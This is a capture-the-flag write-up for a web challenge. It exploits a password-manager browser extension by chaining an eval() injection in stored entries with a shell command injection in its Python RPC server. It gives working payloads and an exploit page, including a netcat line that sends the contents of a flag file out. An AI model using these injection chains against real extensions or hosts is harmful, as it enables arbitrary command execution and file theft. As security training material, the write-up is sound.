# First Fail (Web 400)
We are devloping a new secure password manager! Test it out here: http://challenge.acictf.com:12457
- Does the password manager page perform any insecure actions?
- Try to create a new entry directly

# Installing
This turned out to be the most difficult piece of this challenge for me. I'm running on macOS, so, I had to modify the installation process locations for my machine.

TODO: Detailed steps

Once all done, for some odd reason the plugin would quit unless I ran chrome from the command line.

# Analysis
To get a sense for what this extension does and how it works, we can look through and get a good sense for what's happening.

1. The extension installs and injects some API code into each page that loads. This code is in `api.js`.

2. It sets up an RPC server, which will respond to requests from the browser. This server is run via `host.py`.

3. Once loaded, the extension will communicate via RPC to the server, to get information on the passwords stored for a website.

So, with a general idea, let's dive into seeing what we have for attack surface area.

1. We have the extension, but, we installed that locally.

2. When we load the test website, it tells us the flag is located at `/opt/problems/firstfail_9_fb7f1db7f59364d8901213581e8497af/flag.txt`.

3. We also are given a web URL submission box, that the admin will supposedly visit with the plugin installed.

From this, it appears that we need to somehow craft an exploit via this extension that can read a file on the filesystem. This needs to be delivered via a URL we provide to the admin.

Looking at the scripts we have, `manager.js` sticks out directly as it runs an `eval()` on the data it receives from a stored file.

```JavaScript
for (let account of msg.entries) {
  eval(account);
  ...
}
```

We also notice that the RPC server has some unsafe handling of input when it loads the stored data.

```python
def get_entries(pattern):
    try:
        res = subprocess.check_output('cat data/'+pattern, shell=True)
        return res.decode('latin-1').strip().split('\n')
    except Exception as e:
        logging.exception(str(e))
        return []
```
Finally, we see we can call any of these endpoints via a post message. However, we can't make use of the built-in message sending from the browser, as, a request to the entries endpoint will remove any payload we attach:
```javascript
if (msg.type === 'add_password') {
  msg.host = location.host;
} else if (msg.type === 'get_password' || msg.type === 'entries') {
  // Make domain wildcard pattern to match any subdomain
  let domain = location.host.split('.').slice(-2).join('.')
  msg.pattern = `*${domain}`;
}
```


# Approach
My approach to this will be in a few stages. First, I'll test an exploit locally using only the two vulnerabilities above. Then, I can try to find a way to change the data file on the remote computer.

1. To solve the first piece, I simply need to create a string in the appropriate data file that will run some code in the `eval()` call. As a simple PoC, you can try this:
```JavaScript
username=console.log('testing injection'),password="test"
```
Once added to the file, I can load the manager page in the browser, at `chrome-extension://cegaaaajnnledpnkmnjenhbakdijgcjo/manager.html`. If this worked as expected, we should see a log in the page console, and we do!

2. Now we want to read a file on disk. This can be a bit difficult, since the chrome sandbox will restrict access to local files. However, the RPC server at `host.py` does not have the same restrictions. So, I'm going to craft a payload that the `eval()` will execute, which will send a post message directly to the RPC server, with a command injection. Since this will be sent from a different source, the bit in `app.js` that changes the `entries` messages will not execute.

To make sure I can easily see the output, I simply setup a netcat listener and then use the following injection to test:
```
username=port.postMessage({type: 'entries',pattern: '; echo test | nc 127.0.0.1 1337'}),password="test"
```

I add this to the file, and remove the other tests, then load the manager page, and I see that the listener I setup has in fact received the word `test`.

3. Now, we need to find a way to write this injection into the remote data file. The first tempting option is the `add_password` endpoint, however, we can see from the Python implementation that this will properly escape our input and we won't actually be able to inject any code.
```python
def add_password(host, username, password):
    store_entry(host, 'username=%s,password=%s'%(
        json.dumps(username),
        json.dumps(password)))
    logging.info('Added new password for %s user %s'%(host, username))
```
However, we can see from the above it calls the function `store_entry()`. This function doesn't change our input in any way, so this is perfect.
```python
def store_entry(host, entry):
    host = host.replace('/','')
    with open(os.path.join('data',host), 'a') as f:
        f.write(entry+'\n')
```
Looking closer at the RPC message handler, we can see there is an endpoint to this function directly, `add_entry`:
```python
def rpc_process(msg):
    if msg['type'] == 'add_password':
        add_password(msg['host'],msg['username'],msg['password'])
        return None
    if msg['type'] == 'add_entry':
        store_entry(msg['host'],msg['entry'])
        return None
```
So, as a final recap of the solution to this stage:
1. I'll write a malicious Javascript line into the data file, using a post message to the `add_entry` endpoint.
2. That payload will execute in eval when the manager page is opened.
3. This payload will make a post request to the `entries` endpoint, with a specially crafted pattern to cat the flag and pipe it to a netcat listener.

4. The final step to put this all together is to put it all into a website that I can send to the admin. You can see my example at exploit.html. Since the extension is available in the page, I simply send my requests via it, and then make use of the `openManager()` function to automatically take the admin to the management page (which will execute my payload).
```javascript
window.onload = function() {
  if (window.PasswordManager === undefined) {
    document.getElementById('notice').innerHTML = `<h2 style="color:red">You do no have Secure Password Manager installed...</h2>`;
  } else {
    Promise.race([window.PasswordManager.ping(), new Promise((resolve, reject) => {
      setTimeout(reject,1000);
    })]).then((r)=>{
      window.postMessage({
          type:'add_entry',
          host:"challenge.acictf.com:12457",
          entry: "username=port.postMessage({type: 'entries',pattern: '; cat /opt/problems/firstfail_9_fb7f1db7f59364d8901213581e8497af/flag.txt | nc 127.0.0.1 1337'}),password=\"test\""
  }).then(function() {console.log('done')})
    }).catch(()=>{
      window.PasswordManager.openManager()
      document.getElementById('notice').innerHTML = `<h2 style="color:red">You have the plugin installed, but the RPC is not installed correctly...</h2>`;
    });

  }
}
```
And to finalize this exploit, I setup my listener, and setup a webserver with this file. I then send the admin the URL to my newly created page, and then check the listener for the flag.

# Solution
You can see the overall, final exploit in [exploit.html file](exploit.html).
